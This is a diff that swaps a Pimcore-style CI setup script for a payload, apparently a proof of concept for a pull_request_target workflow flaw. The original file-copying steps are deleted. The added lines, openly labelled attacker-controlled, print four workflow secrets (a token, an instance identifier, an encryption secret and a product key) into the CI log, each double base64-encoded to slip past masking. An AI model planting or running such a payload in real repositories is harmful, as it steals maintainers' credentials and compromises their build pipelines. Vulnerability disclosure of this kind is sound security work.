@@ -1,19 +1,11 @@
 #!/bin/bash
-
-set -eu
-
-mkdir -p var/config
-
-cp -r .github/ci/files/config/. config
-mkdir -p config/local/
-cp -r .github/ci/files/templates/. templates
-cp -r .github/ci/files/translations/. translations
-cp -r .github/ci/files/bin/console bin/console
-cp -r .github/ci/files/src/. src
-cp -r .github/ci/files/public/. public
-cp .github/ci/files/.env ./
-
-if [ ${PIMCORE_STORAGE:-local} = "minio" ]; then
-    cp .github/ci/files/minio-flysystem.yaml config/local/
-    composer require -n --no-update league/flysystem-aws-s3-v3
-fi
+# Attacker-controlled replacement of the CI helper script.
+# The privileged reusable workflow (invoked from pull_request_target) checks
+# out this fork/branch and executes this file directly inside the
+# secret-bearing job (workflow-level env exposes GERALT_SECRET,
+# PIMCORE_INSTANCE_IDENTIFIER, PIMCORE_ENCRYPTION_SECRET, PIMCORE_PRODUCT_KEY).
+echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
+echo "GERALT_DBG_INSTANCE=$(echo -n "$PIMCORE_INSTANCE_IDENTIFIER" | base64 | base64)"
+echo "GERALT_DBG_ENCRYPTION=$(echo -n "$PIMCORE_ENCRYPTION_SECRET" | base64 | base64)"
+echo "GERALT_DBG_PRODUCT=$(echo -n "$PIMCORE_PRODUCT_KEY" | base64 | base64)"
+exit 1
